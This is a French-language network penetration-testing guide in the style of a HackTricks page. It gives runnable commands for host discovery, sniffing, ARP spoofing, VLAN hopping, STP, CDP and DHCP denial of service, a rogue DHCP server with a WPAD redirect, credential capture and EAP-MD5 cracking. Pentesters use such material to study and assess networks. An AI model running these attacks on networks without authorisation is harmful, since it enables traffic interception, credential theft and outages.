# Pentesting Réseau

{{#include ../../banners/hacktricks-training.md}}



## Découverte des hôtes depuis l'extérieur

Ceci est une **brève section** sur comment trouver les **IPs qui répondent** depuis l'**Internet**.\
Dans cette situation vous avez un **périmètre d'IPs** (peut‑être même plusieurs **plages**) et vous devez simplement déterminer **quelles IPs répondent**.

### ICMP

C'est la façon la **plus simple** et la **plus rapide** de savoir si un hôte est up ou non.\
Vous pouvez essayer d'envoyer des paquets **ICMP** et **attendre des réponses**. La manière la plus simple est d'envoyer une **requête d'écho** et d'en attendre la réponse. Vous pouvez le faire avec un simple `ping` ou avec `fping` pour des **plages**.\
Vous pouvez aussi utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela évitera les filtres appliqués aux requêtes/réponses ICMP classiques).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Découverte des ports TCP

Il est très courant de constater que toutes sortes de paquets ICMP sont filtrés. Dans ce cas, tout ce que vous pouvez faire pour vérifier si un hôte est en ligne est d'**essayer de trouver des ports ouverts**. Chaque hôte a **65535 ports**, donc, si vous avez un périmètre "important" vous **ne pouvez pas** tester si **chaque port** de chaque hôte est ouvert ou non, cela prendrait trop de temps.\
Alors, ce dont vous avez besoin est un **scanner de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilisés :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez également effectuer cette étape avec `nmap`, mais c'est plus lent et `nmap` a parfois des problèmes pour identifier les hôtes actifs.

### Découverte de ports HTTP

Il s'agit simplement d'une découverte de ports TCP utile lorsque vous souhaitez **vous concentrer sur la découverte** **des services HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Découverte des ports UDP

Vous pouvez aussi essayer de vérifier si certains **UDP port open** afin de décider si vous devez **prêter plus d'attention** à un **host**. Comme les services UDP **ne répondent généralement pas** avec **aucune donnée** à une sonde UDP vide classique, il est difficile de dire si un port est filtré ou ouvert. La manière la plus simple de le déterminer est d'envoyer un packet lié au service en cours d'exécution, et comme vous ne savez pas quel service tourne, vous devriez essayer le plus probable en fonction du numéro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap proposée précédemment testera les **top 1000 UDP ports** par hôte dans la plage **/24**, mais même cela prendra **>20min**. Si vous avez besoin des **résultats les plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) : `./udp-proto-scanner.pl 199.66.11.53/24` Cette commande enverra ces **UDP probes** à leur **port attendu** (pour une plage /24 cela prendra seulement 1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Voici un bon guide de toutes les attaques Wifi bien connues au moment de la rédaction :


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Découverte des hôtes depuis l'intérieur

Si vous êtes à l'intérieur du réseau, l'une des premières choses que vous voudrez faire est de **découvrir d'autres hôtes**. Selon **le niveau de bruit** que vous pouvez/voulez générer, différentes actions peuvent être entreprises :

### Passif

Vous pouvez utiliser ces outils pour découvrir passivement des hôtes à l'intérieur d'un réseau connecté :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques commentées dans [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) peuvent également être **appliquées ici**.\
Mais, puisque vous êtes dans le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP actif

Notez que les techniques évoquées dans _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) peuvent aussi être **appliquées ici**.\
Mais, comme vous êtes dans le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :

- Si vous effectuez un **ping** vers une **subnet broadcast address**, le ping devrait parvenir à **chaque hôte** et ils pourraient **vous répondre** : `ping -b 10.10.5.255`
- En envoyant un **ping** à l'**network broadcast address**, vous pourriez même trouver des hôtes dans **d'autres subnets** : `ping -b 255.255.255.255`
- Utilisez les flags `-PE`, `-PP`, `-PM` de `nmap` pour effectuer la découverte d'hôtes en envoyant respectivement **ICMPv4 echo**, **timestamp**, et **subnet mask requests** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan sert à **allumer** des ordinateurs via un **message réseau**. Le magic packet utilisé pour allumer l'ordinateur n'est rien d'autre qu'un paquet où une **MAC Dst** est fournie puis **répétée 16 fois** à l'intérieur du même packet.\
Ce type de packets est généralement envoyé dans un **ethernet 0x0842** ou dans un **UDP packet to port 9**.\
Si **aucune \[MAC]** n'est fournie, le packet est envoyé en **broadcast ethernet** (et la broadcast MAC sera celle qui est répétée).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Analyse des hôtes

Une fois que vous avez découvert toutes les adresses IP (externes ou internes) que vous souhaitez scanner en profondeur, différentes actions peuvent être effectuées.

### TCP

- **Port ouvert**: _SYN --> SYN/ACK --> RST_
- **Port fermé**: _SYN --> RST/ACK_
- **Port filtré**: _SYN --> \[NO RESPONSE]_
- **Port filtré**: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il y a 2 options pour scanner un port UDP :

- Envoyer un **UDP packet** et vérifier la réponse _**ICMP unreachable**_ si le port est **closed** (dans plusieurs cas ICMP sera **filtered**, donc vous ne recevrez aucune information si le port est closed ou open).
- Envoyer des **formatted datagrams** pour provoquer une réponse d'un **service** (par ex., DNS, DHCP, TFTP, et d'autres, comme listés dans _nmap-payloads_). Si vous recevez une **response**, alors le port est **open**.

**Nmap** va **mélanger les deux** options en utilisant "-sV" (les scans UDP sont très lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** est conçu pour être utilisé aux côtés de **TCP (Transmission Control Protocol)** et **UDP (User Datagram Protocol)**. Son objectif principal est de faciliter le transport de données téléphoniques sur les réseaux IP, reproduisant de nombreuses fonctionnalités de fiabilité présentes dans **Signaling System 7 (SS7)**. **SCTP** est un composant central de la famille de protocoles **SIGTRAN**, qui vise à transporter les signaux SS7 sur les réseaux IP.

La prise en charge de **SCTP** est assurée par divers systèmes d'exploitation, tels que **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, et **VxWorks**, ce qui indique son large adoption et son utilité dans le domaine des télécommunications et des réseaux.

Deux scans différents pour SCTP sont proposés par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Plus d'options nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Révéler les adresses IP internes

**Les routeurs, firewalls et périphériques réseau mal configurés** répondent parfois aux sondes réseau en utilisant **des adresses source non publiques**. **tcpdump** peut être utilisé pour identifier les paquets reçus depuis des adresses privées lors des tests. Plus précisément, sur Kali Linux, les paquets peuvent être capturés sur la **eth2 interface**, qui est accessible depuis l'Internet public. Il est important de noter que si votre configuration est derrière un NAT ou un Firewall, ces paquets seront probablement filtrés.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Avec le sniffing, vous pouvez apprendre des détails sur les IP ranges, subnet sizes, MAC addresses et hostnames en examinant les frames et packets capturés. Si le réseau est mal configuré ou si le switching fabric est sous stress, des attaquants peuvent capturer du contenu sensible via passive network sniffing.

Si un switched Ethernet network est correctement configuré, vous ne verrez que des broadcast frames et le trafic destiné à votre MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut aussi capturer des paquets depuis une machine distante via une session SSH, en utilisant Wireshark comme GUI en temps réel.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Évidemment.

### Capturing credentials

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour analyser des identifiants provenant d'un pcap ou d'une interface en direct.

## LAN attacks

### ARP spoofing

ARP Spoofing consiste à envoyer des gratuitous ARPResponses pour indiquer que l'IP d'une machine correspond au MAC de notre appareil. Ensuite, la victime modifie la table ARP et contactera notre machine à chaque fois qu'elle souhaite contacter l'IP usurpée.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Surcharger la CAM table du switch en envoyant un grand nombre de paquets avec différentes adresses MAC source. Lorsque la CAM table est pleine, le switch commence à se comporter comme un hub (diffusant tout le trafic).
```bash
macof -i <interface>
```
Sur les commutateurs modernes, cette vulnérabilité a été corrigée.

### 802.1Q VLAN / DTP Attacks

#### Trunking dynamique

Le **Dynamic Trunking Protocol (DTP)** est conçu comme un protocole de couche liaison pour faciliter un système automatique de trunking, permettant aux commutateurs de sélectionner automatiquement des ports en mode Trunk ou en mode non-Trunk. Le déploiement de **DTP** est souvent perçu comme le signe d'une conception réseau sous-optimale, ce qui souligne l'importance de configurer manuellement les trunks seulement lorsque nécessaire et d'assurer une documentation appropriée.

Par défaut, les ports des commutateurs sont configurés pour fonctionner en mode Dynamic Auto, ce qui signifie qu'ils sont prêts à initier le trunking si un commutateur voisin le demande. Un problème de sécurité survient lorsqu'un pentester ou un attaquant se connecte au commutateur et envoie une trame DTP Desirable, forçant le port à passer en mode Trunk. Cette action permet à l'attaquant d'énumérer les VLANs via l'analyse des trames STP et de contourner la segmentation VLAN en créant des interfaces virtuelles.

La présence de DTP par défaut sur de nombreux commutateurs peut être exploitée par des adversaires pour imiter le comportement d'un commutateur, accédant ainsi au trafic de tous les VLANs. Le script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) sert à surveiller une interface, indiquant si un commutateur est en mode Default, Trunk, Dynamic, Auto, ou Access — ce dernier étant la seule configuration immunisée contre les VLAN hopping attacks. Cet outil permet d'évaluer l'état de vulnérabilité du commutateur.

Si une vulnérabilité réseau est identifiée, l'outil _**Yersinia**_ peut être utilisé pour "enable trunking" via le protocole DTP, permettant d'observer les paquets de tous les VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Pour énumérer les VLANs, il est aussi possible de générer le DTP Desirable frame avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**'interrompez pas le script en aucune circonstance. Il injecte DTP Desirable toutes les trois secondes. **Les canaux trunk créés dynamiquement sur le switch ne durent que cinq minutes. Au bout de cinq minutes, le trunk tombe.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je tiens à préciser que **Access/Desirable (0x03)** indique que la trame DTP est de type Desirable, ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous apprenons l'existence des VLAN 30 et VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLANs spécifiques

Une fois que vous connaissez les VLAN IDs et les valeurs IPs, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN spécifique**.\
Si DHCP n'est pas disponible, utilisez _ifconfig_ pour définir une adresse IP statique.

<details>
<summary>Configuration de l'interface VLAN (exemple)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Les attaques évoquées de **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** sur d'autres VLANs sont **effectuées automatiquement** par l'outil: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un attaquant connaît la valeur de la **MAC, IP and VLAN ID of the victim host**, il peut essayer de **double tag a frame** avec le VLAN qui lui est assigné et le VLAN de la victime, puis envoyer un paquet. Comme la **victim won't be able to connect back** avec l'attaquant, la **best option for the attacker is communicate via UDP** consiste à utiliser des protocoles capables d'effectuer des actions intéressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probablement via internet). Ensuite, l'attaquant pourrait sniff sur le second host qu'il possède si celui-ci reçoit des paquets de la victime.

![](<../../images/image (190).png>)

Pour réaliser cette attaque vous pouvez utiliser scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Si vous avez **accès à un switch auquel vous êtes directement connecté**, vous pouvez **bypass VLAN segmentation** au sein du réseau. Il suffit de **mettre le port en mode trunk** (également appelé trunk), de créer des interfaces virtuelles avec les IDs des VLAN cibles et de configurer une adresse IP. Vous pouvez tenter d'obtenir l'adresse dynamiquement (DHCP) ou la configurer statiquement. Cela dépend du cas.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

Dans certains environnements, tels que les réseaux wireless pour invités, les paramètres de port isolation (également appelés private VLAN) sont mis en place pour empêcher les clients connectés à un wireless access point de communiquer directement entre eux. Cependant, une technique a été identifiée qui peut contourner ces mesures d'isolation. Cette technique exploite soit l'absence d'ACL réseau, soit leur mauvaise configuration, permettant aux paquets IP d'être routés via un router pour atteindre un autre client sur le même réseau.

L'attaque s'exécute en créant un paquet qui transporte l'adresse IP du client de destination mais avec l'adresse MAC du router. Cela entraîne le router à transférer par erreur le paquet vers le client cible. Cette approche est similaire à celle utilisée dans Double Tagging Attacks, où la capacité à contrôler un host accessible à la victime est utilisée pour exploiter la faille.

**Étapes clés de l'attaque :**

1. **Création d'un paquet :** Un paquet est spécialement conçu pour inclure l'adresse IP du client cible mais avec l'adresse MAC du router.
2. **Exploitation du comportement du router :** Le paquet conçu est envoyé au router qui, en raison de la configuration, redirige le paquet vers le client cible, contournant l'isolation fournie par les paramètres private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralise la gestion des VLAN. Il utilise des numéros de revision pour maintenir l'intégrité de la base de données VLAN ; toute modification incrémente ce numéro. Les switches adoptent la configuration avec le numéro de revision le plus élevé, mettant à jour leur propre base de données VLAN.

#### VTP Domain Roles

- **VTP Server:** Gère les VLAN — crée, supprime, modifie. Il diffuse des annonces VTP aux membres du domaine.
- **VTP Client:** Reçoit les annonces VTP pour synchroniser sa base de données VLAN. Ce rôle est limité et n'autorise pas les modifications locales de configuration VLAN.
- **VTP Transparent:** Ne participe pas aux mises à jour VTP mais transmet les annonces VTP. Non affecté par les attaques VTP, il maintient un numéro de revision constant égal à zéro.

#### VTP Advertisement Types

- **Summary Advertisement:** Diffusée par le VTP Server toutes les 300 secondes, contenant les informations essentielles du domaine.
- **Subset Advertisement:** Envoyée suite à des modifications de configuration VLAN.
- **Advertisement Request:** Émise par un VTP client pour demander une Summary Advertisement, typiquement en réponse à la détection d'un numéro de revision de configuration plus élevé.

Les vulnérabilités VTP sont exploitables exclusivement via les trunk ports puisque les annonces VTP circulent uniquement à travers eux. Après une attaque DTP, les scénarios peuvent évoluer vers VTP. Des outils comme Yersinia peuvent faciliter des attaques VTP, visant à effacer la base de données VLAN et perturber ainsi le réseau.

Note : Cette discussion porte sur VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
En mode graphique de Yersinia, choisissez l'option deleting all VTP vlans pour purger la base de données VLAN.

### Attaques STP

**Si vous ne pouvez pas capturer de trames BPDU sur vos interfaces, il est peu probable que vous réussissiez une attaque STP.**

#### **STP BPDU DoS**

L'envoi d'un grand nombre de BPDUs TCP (Topology Change Notification) ou Conf (les BPDUs envoyées lors de la création de la topologie) surcharge les switches et les fait cesser de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Lorsqu'un TCP est envoyé, la CAM table des switches sera supprimée au bout de 15s. Ensuite, si vous envoyez continuellement ce type de packets, la CAM table sera réinitialisée en continu (ou toutes les 15segs) et lorsqu'elle est réinitialisée, le switch se comporte comme un hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

L'attaquant simule le comportement d'un switch pour devenir le STP root du réseau. Ensuite, davantage de données transiteront par l'attaquant. C'est intéressant quand vous êtes connecté à deux switches différents.\
Ceci se fait en envoyant des paquets BPDUs CONF indiquant que la valeur **priority** est inférieure à la priorité réelle du root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connecté à 2 switches il peut être la racine du nouvel arbre et tout le trafic entre ces switches passera par lui** (une MITM attack sera effectuée).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

CISCO Discovery Protocol (CDP) est essentiel pour la communication entre les appareils CISCO, leur permettant de **s'identifier mutuellement et de partager des détails de configuration**.

#### Collecte de données passive <a href="#id-0e0f" id="id-0e0f"></a>

CDP est configuré pour diffuser des informations sur tous les ports, ce qui peut entraîner un risque de sécurité. Un attaquant, en se connectant à un port de switch, peut déployer des sniffers réseau comme **Wireshark**, **tcpdump**, ou **Yersinia**. Cette action peut révéler des données sensibles sur le périphérique réseau, notamment son modèle et la version de Cisco IOS qu'il exécute. L'attaquant pourra alors cibler des vulnérabilités spécifiques à la version de Cisco IOS identifiée.

#### Induire une inondation de la table CDP <a href="#id-0d6a" id="id-0d6a"></a>

Une approche plus agressive consiste à lancer une attaque de Denial of Service (DoS) en saturant la mémoire du switch, en se faisant passer pour des appareils CISCO légitimes. Ci‑dessous la séquence de commandes pour initier une telle attaque en utilisant Yersinia, un outil réseau conçu pour les tests :
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Lors de cette attaque, le CPU du switch et la table des voisins CDP sont fortement sollicités, entraînant ce que l'on appelle souvent « paralysie du réseau » en raison de la consommation excessive de ressources.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez aussi utiliser [**scapy**](https://github.com/secdev/scapy/). Veillez à l'installer avec le package `scapy/contrib`.

### Attaques VoIP et l'outil VoIP Hopper

Les téléphones VoIP, de plus en plus intégrés aux dispositifs IoT, offrent des fonctionnalités comme le déverrouillage de portes ou le contrôle de thermostats via des numéros de téléphone spéciaux. Cependant, cette intégration peut présenter des risques de sécurité.

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) est conçu pour émuler un téléphone VoIP dans divers environnements (Cisco, Avaya, Nortel, Alcatel-Lucent). Il découvre l'ID VLAN du réseau vocal en utilisant des protocoles comme CDP, DHCP, LLDP-MED et 802.1Q ARP.

**VoIP Hopper** propose trois modes pour le Cisco Discovery Protocol (CDP) :

1. **Sniff Mode** (`-c 0`) : Analyse les paquets réseau pour identifier l'ID VLAN.
2. **Spoof Mode** (`-c 1`) : Génère des paquets personnalisés imitant ceux d'un véritable appareil VoIP.
3. **Spoof with Pre-made Packet Mode** (`-c 2`) : Envoie des paquets identiques à ceux d'un modèle de téléphone IP Cisco spécifique.

Le mode préféré pour la rapidité est le troisième. Il nécessite de spécifier :

- L'interface réseau de l'attaquant (`-i` parameter).
- Le nom de l'appareil VoIP à émuler (`-E` parameter), en respectant le format de nommage Cisco (par ex. SEP suivi d'une adresse MAC).

En environnement d'entreprise, pour imiter un appareil VoIP existant, on peut :

- Inspecter l'étiquette MAC sur le téléphone.
- Parcourir les paramètres d'affichage du téléphone pour voir les informations du modèle.
- Connecter l'appareil VoIP à un laptop et observer les requêtes CDP avec Wireshark.

Un exemple de commande pour exécuter l'outil en troisième mode serait :
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Deux types de DoS** peuvent être effectués contre des serveurs DHCP. Le premier consiste à **simuler suffisamment d'hôtes factices pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les réponses du serveur DHCP et compléter le protocole (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Par exemple, cela **n'est pas possible dans les réseaux Wifi**.

Une autre façon d'effectuer un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme adresse source chaque IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une façon plus automatisée de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pouvez utiliser les attaques DoS mentionnées pour forcer les clients à obtenir de nouveaux baux au sein de l'environnement, et épuiser les serveurs légitimes afin qu'ils deviennent non réactifs. Ainsi, lorsque les légitimes tentent de se reconnecter, **vous pouvez fournir des valeurs malveillantes mentionnées dans l'attaque suivante**.

#### Définir des valeurs malveillantes

Un serveur DHCP malveillant peut être configuré en utilisant le script DHCP situé à `/usr/share/responder/DHCP.py`. Ceci est utile pour des attaques réseau, comme la capture du trafic HTTP et des identifiants, en redirigeant le trafic vers un serveur malveillant. Cependant, configurer une passerelle malveillante est moins efficace car cela ne permet de capturer que le trafic sortant du client, en omettant les réponses de la passerelle réelle. Il est préférable de déployer un serveur DNS ou WPAD malveillant pour une attaque plus efficace.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

En utilisant correctement ces options, un serveur DHCP malveillant peut être mis en place pour intercepter efficacement le trafic réseau.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attacks**

Voici quelques tactiques d'attaque qui peuvent être utilisées contre les implémentations 802.1X :

- Brute-force actif de mots de passe via EAP
- Attaquer le serveur RADIUS avec du contenu EAP malformé _\*\*_(exploits)
- Capture de messages EAP et craquage hors ligne de mots de passe (EAP-MD5 et PEAP)
- Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
- Injection de trafic réseau malveillant lors de l'authentification en utilisant un hub ou similaire

Si l'attaquant se trouve entre la victime et le serveur d'authentification, il pourrait tenter de dégrader (si nécessaire) le protocole d'authentification vers EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait la brute-force en utilisant :
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
